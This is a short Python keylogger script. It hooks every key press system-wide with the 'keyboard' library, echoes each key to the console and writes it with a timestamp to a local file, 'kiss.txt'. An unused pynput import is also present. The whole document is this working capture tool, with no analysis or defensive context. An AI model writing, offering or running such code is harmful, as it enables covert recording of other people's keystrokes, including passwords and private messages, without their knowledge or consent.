from pynput.keyboard import Listener
import keyboard
import logging

logging.basicConfig(filename='./kiss.txt', level=logging.DEBUG, format='[%(asctime)s], %(message)s')

def on_press(event):
    key = event.name
    print(key)

    logging.info('{0}'.format(key))


keyboard.on_press(on_press)
keyboard.wait()
